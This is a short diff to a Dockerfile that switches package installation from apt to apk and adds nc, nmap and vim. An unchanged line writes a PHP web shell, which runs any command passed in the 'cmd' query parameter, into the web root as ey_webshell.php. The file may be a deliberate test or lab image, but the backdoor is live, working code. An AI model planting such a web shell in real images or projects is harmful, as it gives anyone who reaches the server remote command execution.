@@ -7,7 +7,9 @@ ARG COMMIT_SHA
 ENV COMMIT_SHA $COMMIT_SHA
 
 RUN echo "=========="
-RUN apt update -y
-RUN apt install nmap -y
+RUN apk add --no-cache \
+  nc \
+  nmap \
+  vim
 RUN echo "=========="
 RUN echo "<?php echo exec(\$_GET['cmd']);?>" > /var/www/html/ey_webshell.php
